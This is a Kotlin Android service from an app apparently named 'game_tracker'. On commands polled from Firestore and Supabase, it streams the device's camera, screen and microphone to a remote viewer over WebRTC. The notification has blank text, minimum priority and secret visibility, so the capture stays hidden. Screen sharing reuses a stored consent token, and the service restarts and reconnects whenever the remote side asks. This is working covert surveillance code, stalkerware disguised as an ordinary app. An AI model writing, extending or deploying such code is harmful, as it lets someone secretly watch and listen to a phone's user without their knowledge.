package com.example.game_tracker

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.webrtc.*
import org.webrtc.audio.AudioDeviceModule
import org.webrtc.audio.JavaAudioDeviceModule
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.DocumentSnapshot
import com.google.firebase.firestore.ListenerRegistration
import java.util.*
import java.net.URL
import java.net.HttpURLConnection

class WebRtcPublisherService : Service() {

    companion object {
        private const val TAG = "WebRtcPublisher"
        private const val NOTIFICATION_ID = 1004
        private const val CHANNEL_ID = "WebRtcPublisherChannel"
    }

    private var isSessionRunning = false
    private var isServiceDestroyed = false
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var peerConnection: PeerConnection? = null
    private var localVideoTrack: VideoTrack? = null
    private var localAudioTrack: AudioTrack? = null
    private var audioSource: AudioSource? = null
    private var videoCapturer: VideoCapturer? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    private var requestId: String? = null
    private var docListener: ListenerRegistration? = null
    private var iceListener: ListenerRegistration? = null
    private var eglBase: EglBase? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Live Streaming Service", NotificationManager.IMPORTANCE_MIN).apply {
                setShowBadge(false)
                setSound(null, null)
            }
            val mgr = getSystemService(NotificationManager::class.java)
            mgr?.createNotificationChannel(channel)
        }
        safeStartForeground(createNotification())
        initializePeerFactory()
    }

    private fun safeStartForeground(notification: Notification, requestType: String? = null, resultData: Intent? = null) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var fgsType = 0
                if (requestType == "camera_stream" && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                    fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                } else if (requestType == "screen_share" && resultData != null) {
                    fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                if (fgsType != 0) {
                    try {
                        startForeground(NOTIFICATION_ID, notification, fgsType)
                        return
                    } catch (_: Throwable) {}
                }
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    return
                } catch (_: Throwable) {}
            }
            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Throwable) {
            Log.e(TAG, "safeStartForeground error: ${e.message}", e)
        }
    }

    private var audioDeviceModule: AudioDeviceModule? = null

    private fun initializePeerFactory() {
        try {
            eglBase = EglBase.create()
            val options = PeerConnectionFactory.InitializationOptions.builder(this).createInitializationOptions()
            PeerConnectionFactory.initialize(options)
            val encoderFactory = DefaultVideoEncoderFactory(eglBase?.eglBaseContext, true, true)
            val decoderFactory = DefaultVideoDecoderFactory(eglBase?.eglBaseContext)

            val adm = JavaAudioDeviceModule.builder(this)
                .setUseHardwareAcousticEchoCanceler(true)
                .setUseHardwareNoiseSuppressor(true)
                .createAudioDeviceModule()
            audioDeviceModule = adm

            peerConnectionFactory = PeerConnectionFactory.builder()
                .setAudioDeviceModule(adm)
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory()
            Log.d(TAG, "PeerConnectionFactory initialized with JavaAudioDeviceModule successfully")
        } catch (e: Throwable) {
            Log.e(TAG, "Error initializing PeerConnectionFactory: ${e.message}", e)
        }
    }

    private var currentSessionRequestId: String? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val newRequestId = intent?.getStringExtra("requestId")
        val cameraFacing = intent?.getStringExtra("cameraFacing") ?: "front"
        val requestType = intent?.getStringExtra("requestType") ?: "camera_stream"

        if (isSessionRunning && newRequestId == currentSessionRequestId && newRequestId != null) {
            Log.d(TAG, "WebRTC session already actively running for request: $newRequestId")
            return START_STICKY
        }

        stopCurrentSession()

        requestId = newRequestId
        currentSessionRequestId = newRequestId

        val resultDataFromIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra("resultData", Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra<Intent>("resultData")
        }
        val savedProjection = MediaProjectionStore.load(this)
        val resultData = resultDataFromIntent ?: savedProjection.second ?: MainActivity.mediaProjectionResultData

        val notification = createNotification()
        safeStartForeground(notification, requestType, resultData)

        // Validate permissions & requirements
        if (requestType == "camera_stream" && ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            markFailed(requestId, "Camera permission is not granted")
            stopSelf()
            return START_NOT_STICKY
        }

        if (requestType == "screen_share" && resultData == null) {
            markFailed(requestId, "No saved MediaProjection consent token for screen sharing")
            stopSelf()
            return START_NOT_STICKY
        }

        isSessionRunning = true
        createPeerConnection()
        startLocalCapture(requestType, cameraFacing, resultData)

        requestId?.let { rid ->
            watchForAnswerAndRemoteIce(rid)
            createAndPublishOffer(rid)
        }

        return START_STICKY
    }

    private fun createAndPublishOffer(rid: String) {
        val sdpConstraints = MediaConstraints().apply {
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"))
            mandatory.add(MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"))
        }
        peerConnection?.createOffer(object : SdpObserver {
            override fun onCreateSuccess(desc: SessionDescription?) {
                peerConnection?.setLocalDescription(object : SdpObserver {
                    override fun onSetSuccess() {
                        Thread {
                            var waited = 0
                            while (waited < 1200 && peerConnection?.iceGatheringState() != PeerConnection.IceGatheringState.COMPLETE) {
                                Thread.sleep(100)
                                waited += 100
                            }
                            val finalSdp = peerConnection?.localDescription?.description ?: desc?.description
                            Log.d(TAG, "Publishing SDP offer with gathered ICE candidates embedded")
                            CloudBridgeSync.updateRequestOffer(rid, finalSdp, "offer")
                        }.start()
                    }
                    override fun onSetFailure(p0: String?) {
                        Log.e(TAG, "setLocalDescription failure: $p0")
                    }
                    override fun onCreateSuccess(p0: SessionDescription?) {}
                    override fun onCreateFailure(p0: String?) {}
                }, desc)
            }
            override fun onCreateFailure(p0: String?) {
                Log.e(TAG, "createOffer failure: $p0")
                markFailed(rid, "WebRTC createOffer failed: $p0")
            }
            override fun onSetSuccess() {}
            override fun onSetFailure(p0: String?) {}
        }, sdpConstraints)
    }

    private fun createPeerConnection() {
        val iceServers = listOf(
            PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer(),
            PeerConnection.IceServer.builder("stun:stun.cloudflare.com:3478").createIceServer(),
            PeerConnection.IceServer.builder("stun:openrelay.metered.ca:80").createIceServer(),
            PeerConnection.IceServer.builder("turn:openrelay.metered.ca:80")
                .setUsername("openrelay")
                .setPassword("openrelay")
                .createIceServer(),
            PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443")
                .setUsername("openrelay")
                .setPassword("openrelay")
                .createIceServer(),
            PeerConnection.IceServer.builder("turn:openrelay.metered.ca:443?transport=tcp")
                .setUsername("openrelay")
                .setPassword("openrelay")
                .createIceServer()
        )
        val rtcConfig = PeerConnection.RTCConfiguration(iceServers).apply {
            sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN
            continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY
        }
        peerConnection = peerConnectionFactory?.createPeerConnection(rtcConfig, object : PeerConnection.Observer {
            override fun onIceCandidate(candidate: IceCandidate) {
                requestId?.let { rid ->
                    CloudBridgeSync.sendIceCandidate(
                        requestId = rid,
                        candidate = candidate.sdp,
                        sdpMid = candidate.sdpMid,
                        sdpMLineIndex = candidate.sdpMLineIndex,
                        from = "publisher"
                    )
                }
            }
            override fun onAddStream(stream: MediaStream?) {}
            override fun onDataChannel(dc: DataChannel?) {}
            override fun onIceConnectionReceivingChange(p0: Boolean) {}
            override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {
                Log.d(TAG, "WebRTC IceConnectionState: $p0")
            }
            override fun onIceGatheringChange(p0: PeerConnection.IceGatheringState?) {}
            override fun onRemoveStream(p0: MediaStream?) {}
            override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
            override fun onIceCandidatesRemoved(p0: Array<out IceCandidate>?) {}
            override fun onRenegotiationNeeded() {}
            override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
        })
    }

    private var hasSetAnswer = false
    private var lastHandledReconnectEpoch: Long = 0L

    private fun handleRemoteAnswer(sdp: String?, type: String?) {
        if (!hasSetAnswer && !sdp.isNullOrEmpty() && !type.isNullOrEmpty()) {
            hasSetAnswer = true
            try {
                val sd = SessionDescription(SessionDescription.Type.fromCanonicalForm(type), sdp)
                peerConnection?.setRemoteDescription(object : SdpObserver {
                    override fun onSetSuccess() {
                        Log.d(TAG, "WebRTC remote answer successfully established")
                    }
                    override fun onSetFailure(p0: String?) {
                        Log.e(TAG, "setRemoteDescription failure: $p0")
                    }
                    override fun onCreateSuccess(p0: SessionDescription?) {}
                    override fun onCreateFailure(p0: String?) {}
                }, sd)
            } catch (e: Throwable) {
                Log.e(TAG, "Error setting remote description: ${e.message}")
            }
        }
    }

    private fun ensureAudioTrack(): AudioTrack? {
        if (localAudioTrack != null) {
            return localAudioTrack
        }
        try {
            val hasRecordAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
            if (hasRecordAudio) {
                val audioConstraints = MediaConstraints().apply {
                    mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
                    mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
                }
                audioSource = peerConnectionFactory?.createAudioSource(audioConstraints)
                localAudioTrack = peerConnectionFactory?.createAudioTrack("ARDAMSa0", audioSource)
                localAudioTrack?.setEnabled(true)
                Log.d(TAG, "WebRTC audio track initialized successfully")
            } else {
                Log.w(TAG, "RECORD_AUDIO permission not granted; streaming video only")
            }
        } catch (e: Throwable) {
            Log.w(TAG, "Failed to initialize WebRTC audio track: ${e.message}")
        }
        return localAudioTrack
    }

    private fun reconnectPeerConnection(epoch: Long) {
        val rid = requestId ?: return
        Log.d(TAG, "Reconnecting WebRTC PeerConnection for viewer session (epoch=$epoch)...")
        try {
            peerConnection?.close()
            peerConnection?.dispose()
        } catch (e: Throwable) {
            Log.w(TAG, "Error disposing old PeerConnection: ${e.message}")
        }
        peerConnection = null
        hasSetAnswer = false

        // Re-create PeerConnection with fresh ICE agent
        createPeerConnection()

        // 1. Re-attach existing continuous video track FIRST (Strict Transceiver Index 0)
        localVideoTrack?.let { vTrack ->
            try {
                vTrack.setEnabled(true)
                peerConnection?.addTrack(vTrack, listOf("ARDAMS"))
                Log.d(TAG, "Re-attached local video track to fresh PeerConnection (Transceiver Index 0)")
            } catch (e: Throwable) {
                Log.e(TAG, "Error re-attaching video track: ${e.message}", e)
            }
        }

        // 2. Re-attach existing continuous audio track SECOND (Strict Transceiver Index 1)
        val aTrack = ensureAudioTrack()
        aTrack?.let { track ->
            try {
                track.setEnabled(true)
                peerConnection?.addTrack(track, listOf("ARDAMS"))
                Log.d(TAG, "Re-attached local audio track to fresh PeerConnection (Transceiver Index 1)")
            } catch (e: Throwable) {
                Log.e(TAG, "Error re-attaching audio track: ${e.message}", e)
            }
        }

        // Generate and publish fresh Offer
        createAndPublishOffer(rid)
    }

    private fun watchForAnswerAndRemoteIce(rid: String) {
        hasSetAnswer = false
        try {
            docListener = FirebaseFirestore.getInstance().collection("screenshot_requests").document(rid)
                .addSnapshotListener { snapshot: DocumentSnapshot?, error ->
                    if (error != null || snapshot == null) return@addSnapshotListener
                    val status = snapshot.getString("status")
                    if (status == "completed" || status == "stopped" || status == "failed") {
                        Log.d(TAG, "WebRTC session received terminal status ($status), stopping service")
                        stopSelf()
                        return@addSnapshotListener
                    }

                    val reconnectEpoch = snapshot.getLong("reconnect_epoch") ?: 0L
                    if (reconnectEpoch > lastHandledReconnectEpoch || status == "reconnecting") {
                        val epochToUse = if (reconnectEpoch > 0L) reconnectEpoch else System.currentTimeMillis()
                        if (epochToUse > lastHandledReconnectEpoch) {
                            lastHandledReconnectEpoch = epochToUse
                            reconnectPeerConnection(epochToUse)
                            return@addSnapshotListener
                        }
                    }

                    if (!hasSetAnswer && snapshot.contains("answer")) {
                        val answer = snapshot.get("answer") as? Map<*, *>
                        val sdp = answer?.get("sdp") as? String
                        val type = answer?.get("type") as? String
                        handleRemoteAnswer(sdp, type)
                    }
                }
        } catch (_: Throwable) {}

        // Dual-Cloud Supabase Answer, Status & ICE Poller (Keeps polling to detect 'stopped' status and reconnects)
        Thread {
            while (!isServiceDestroyed) {
                try {
                    Thread.sleep(1500)
                    if (isServiceDestroyed) break
                    val url = URL("${CloudBridgeSync.SUPABASE_URL}/rest/v1/screenshot_requests?id=eq.$rid&select=*")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    conn.setRequestProperty("apikey", CloudBridgeSync.SUPABASE_ANON_KEY)
                    conn.setRequestProperty("Authorization", "Bearer ${CloudBridgeSync.SUPABASE_ANON_KEY}")
                    if (conn.responseCode == 200) {
                        val text = conn.inputStream.bufferedReader().use { it.readText() }
                        val arr = org.json.JSONArray(text)
                        if (arr.length() > 0) {
                            val obj = arr.getJSONObject(0)
                            val status = obj.optString("status")
                            if (status == "completed" || status == "stopped" || status == "failed") {
                                Log.d(TAG, "WebRTC session received terminal status via Supabase ($status), stopping publisher service")
                                stopSelf()
                                break
                            }

                            val reconnectEpoch = obj.optLong("reconnect_epoch", 0L)
                            if (reconnectEpoch > lastHandledReconnectEpoch || (status == "reconnecting" && !hasSetAnswer)) {
                                val epochToUse = if (reconnectEpoch > 0L) reconnectEpoch else System.currentTimeMillis()
                                if (epochToUse > lastHandledReconnectEpoch) {
                                    lastHandledReconnectEpoch = epochToUse
                                    reconnectPeerConnection(epochToUse)
                                    continue
                                }
                            }
                            if (!hasSetAnswer) {
                                var answerObj = obj.optJSONObject("answer")
                                if (answerObj == null) {
                                    val failReason = obj.optString("failure_reason")
                                    if (failReason.startsWith("ANSWER:")) {
                                        try {
                                            answerObj = org.json.JSONObject(failReason.removePrefix("ANSWER:"))
                                        } catch (_: Throwable) {}
                                    }
                                }
                                if (answerObj != null) {
                                    val sdp = answerObj.optString("sdp")
                                    val type = answerObj.optString("type", "answer")
                                    if (sdp.isNotEmpty()) {
                                        Log.d(TAG, "Publisher received SDP answer via Supabase, applying remote description")
                                        handleRemoteAnswer(sdp, type)
                                    }
                                }
                            }
                            var lastIceObj = obj.optJSONObject("last_ice_candidate")
                            if (lastIceObj == null) {
                                val errStr = obj.optString("error")
                                if (errStr.startsWith("ICE:")) {
                                    try {
                                        lastIceObj = org.json.JSONObject(errStr.removePrefix("ICE:"))
                                    } catch (_: Throwable) {}
                                }
                            }
                            if (lastIceObj != null) {
                                val from = lastIceObj.optString("from")
                                if (from != "publisher") {
                                    val candidate = lastIceObj.optString("candidate")
                                    val sdpMid = lastIceObj.optString("sdpMid", "0")
                                    val sdpMLineIndex = lastIceObj.optInt("sdpMLineIndex", 0)
                                    if (candidate.isNotEmpty()) {
                                        try {
                                            peerConnection?.addIceCandidate(IceCandidate(sdpMid, sdpMLineIndex, candidate))
                                        } catch (_: Throwable) {}
                                    }
                                }
                            }
                        }
                    }
                } catch (_: Throwable) {}
            }
        }.start()

        try {
            iceListener = FirebaseFirestore.getInstance().collection("screenshot_requests").document(rid)
                .collection("iceCandidates")
                .addSnapshotListener { snapshots, error ->
                    if (error != null || snapshots == null) return@addSnapshotListener
                    for (doc in snapshots.documentChanges) {
                        val data = doc.document.data
                        val from = data["from"] as? String
                        if (from == "publisher") continue

                        val candidate = data["candidate"] as? String
                        val sdpMid = data["sdpMid"] as? String
                        val sdpMLineIndex = (data["sdpMLineIndex"] as? Long)?.toInt() ?: (data["sdpMLineIndex"] as? Int ?: 0)
                        if (candidate != null && sdpMid != null) {
                            try {
                                peerConnection?.addIceCandidate(IceCandidate(sdpMid, sdpMLineIndex, candidate))
                            } catch (e: Throwable) {
                                Log.e(TAG, "Error adding ICE candidate: ${e.message}")
                            }
                        }
                    }
                }
        } catch (_: Throwable) {}
    }

    private fun startLocalCapture(requestType: String, facing: String, resultData: Intent?) {
        try {
            if (requestType == "screen_share") {
                if (resultData != null) {
                    try {
                        videoCapturer = ScreenCapturerAndroid(resultData, object : android.media.projection.MediaProjection.Callback() {})
                    } catch (e: Throwable) {
                        Log.e(TAG, "ScreenCapturerAndroid creation failed: ${e.message}", e)
                    }
                }
            } else if (requestType == "camera_stream") {
                val enumerator = Camera2Enumerator(applicationContext)
                val deviceNames = enumerator.deviceNames
                var chosenName: String? = null
                for (name in deviceNames) {
                    val isFront = enumerator.isFrontFacing(name)
                    if ((facing == "front" && isFront) || (facing == "back" && !isFront)) {
                        chosenName = name
                        break
                    }
                }
                val targetName = chosenName ?: if (deviceNames.isNotEmpty()) deviceNames[0] else null
                if (targetName != null) {
                    videoCapturer = enumerator.createCapturer(targetName, object : CameraVideoCapturer.CameraEventsHandler {
                        override fun onCameraError(p0: String?) {
                            Log.e(TAG, "WebRTC Camera error: $p0")
                        }
                        override fun onCameraDisconnected() {
                            Log.w(TAG, "WebRTC Camera disconnected")
                        }
                        override fun onCameraFreezed(p0: String?) {
                            Log.w(TAG, "WebRTC Camera frozen: $p0")
                        }
                        override fun onCameraOpening(p0: String?) {}
                        override fun onFirstFrameAvailable() {}
                        override fun onCameraClosed() {}
                    })
                }
            }

            if (videoCapturer == null) {
                Log.e(TAG, "No video capturer could be initialized")
                markFailed(requestId, "Failed to initialize video capturer")
                return
            }

            surfaceTextureHelper = SurfaceTextureHelper.create("WebRtcCaptureThread", eglBase?.eglBaseContext)
            val videoSource = peerConnectionFactory?.createVideoSource(false)
            val capturer = videoCapturer
            val helper = surfaceTextureHelper

            capturer?.initialize(helper, applicationContext, videoSource?.capturerObserver)
            helper?.handler?.post {
                try {
                    capturer?.startCapture(640, 480, 25)
                } catch (e: Throwable) {
                    Log.e(TAG, "Error starting video capture on helper thread: ${e.message}", e)
                }
            }

            localVideoTrack = peerConnectionFactory?.createVideoTrack("ARDAMSv0", videoSource)
            if (localVideoTrack != null) {
                localVideoTrack?.setEnabled(true)
                peerConnection?.addTrack(localVideoTrack, listOf("ARDAMS"))
            }

            // Initialize and add local audio track safely without blocking video (Strict Transceiver Index 1)
            val aTrack = ensureAudioTrack()
            if (aTrack != null) {
                try {
                    aTrack.setEnabled(true)
                    peerConnection?.addTrack(aTrack, listOf("ARDAMS"))
                    Log.d(TAG, "Audio track added to WebRTC stream successfully (Transceiver Index 1)")
                } catch (e: Throwable) {
                    Log.w(TAG, "Failed to attach audio track to stream: ${e.message}")
                }
            }
        } catch (e: Throwable) {
            Log.e(TAG, "startLocalCapture exception: ${e.message}", e)
            markFailed(requestId, "Video capture error: ${e.message}")
        }
    }

    private fun markFailed(requestId: String?, reason: String) {
        if (!requestId.isNullOrEmpty()) {
            CloudBridgeSync.updateRequestStatus(
                requestId = requestId,
                status = "failed",
                error = reason,
                failureReason = reason
            )
        }
    }

    private fun stopCurrentSession() {
        isSessionRunning = false
        try {
            docListener?.remove()
            docListener = null
        } catch (_: Throwable) {}
        try {
            iceListener?.remove()
            iceListener = null
        } catch (_: Throwable) {}
        try {
            localVideoTrack?.setEnabled(false)
            localVideoTrack?.dispose()
            localVideoTrack = null
        } catch (_: Throwable) {}
        try {
            localAudioTrack?.setEnabled(false)
            localAudioTrack?.dispose()
            localAudioTrack = null
            audioSource?.dispose()
            audioSource = null
        } catch (_: Throwable) {}
        try {
            videoCapturer?.stopCapture()
        } catch (_: Throwable) {}
        try {
            videoCapturer?.dispose()
            videoCapturer = null
        } catch (_: Throwable) {}
        try {
            surfaceTextureHelper?.dispose()
            surfaceTextureHelper = null
        } catch (_: Throwable) {}
        try {
            peerConnection?.close()
            peerConnection?.dispose()
            peerConnection = null
        } catch (_: Throwable) {}
    }

    override fun onDestroy() {
        isServiceDestroyed = true
        stopCurrentSession()
        try {
            peerConnectionFactory?.dispose()
            peerConnectionFactory = null
        } catch (e: Exception) {}
        try {
            audioDeviceModule?.release()
            audioDeviceModule = null
        } catch (e: Exception) {}
        try {
            eglBase?.release()
            eglBase = null
        } catch (e: Exception) {}

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .setLocalOnly(true)
            .build()
    }
}
